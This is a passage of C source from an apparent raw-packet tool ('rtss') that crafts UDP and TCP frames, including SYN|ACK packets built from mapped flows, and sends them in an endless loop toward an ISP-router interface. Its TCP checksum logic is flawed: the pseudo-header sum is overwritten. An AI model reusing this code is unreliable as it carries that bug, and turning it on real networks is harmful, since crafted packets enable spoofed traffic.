			udp->chksum = in_chksum(udp, ip_datalen);
			break;
		case IPPROTO_TCP:
			//rtssv3
			tcp = l4_hdr;
			tcp->sport = map_flow->net_flow.sport;
			tcp->dport = map_flow->net_flow.dport;
			tcp->flags = SYN | ACK;

			//calculate tcp chksum
			phdr->saddr = ip->saddr;
			phdr->daddr = ip->daddr;
			phdr->zero = 0;
			phdr->proto = IPPROTO_TCP;
			phdr->len = htons(ip_datalen);

			tcp->chksum = in_chksum(phdr, sizeof(struct pseudo_hdr));
			tcp->chksum = in_chksum(tcp, ip_datalen);
			break;
		default:
			;
	}

	//recompute ip checksum
	ip->chksum = 0;
	ip->chksum = in_chksum(ip, ip->hl << 2);

	build_eth_hdr(pkt, send_dst_mac, send_src_mac,  eth_type);

	send(output_sfd, pkt, frame_len, 0);

	//free allocated resources
	free(pkt);
	free(flow);
	free(rev_flow);
	free(phdr);
}

rtss_loop() { printf("generate()\n");
	//all traffic of all targets is already collected in edge_rtr_ls,
	//and their map traffic is already collected in isp_rtr_ls, so

	struct rtss_flow *flw;

	while(flw = ls_fetch(&isp_flwls) ) {//for each rtss_flow in isp_rtr_ls
		rtss_send_pkt(isp_rtr_sfd, flw, isp_rtr_mac, rtss_isp_mac); 	//build and send packet
		rtss_recv_pkt(isp_rtr_sfd);//TEMP
		usleep(rtss_send_delay);
	}
}

int
main(int argc, char *argv[]) {

	//define required resources and data structures
	//a socket for ISP router link/interface/socket
	//a socket for EdgeRouter link
	//list of target 
	//table mapping targets with type of
		//traffic to target

	fd_set rd_set;
	int mx_slct, n;
	struct sigaction sa;

	if(argc < 2) {
		printf("usage: ./rtss config_file\n");
		exit(1);
	}
	
	init_lists();

	get_cfg(argv[1]);//<-> get cmd line argument (a text file)

//exit(0);
//	chk_trfc_semantics();

	/*prepare required resources and data structures*/

	setup_rtss_sockets();
	
	build_flow_mapping();

	while(1) {
		rtss_loop();
	}
}
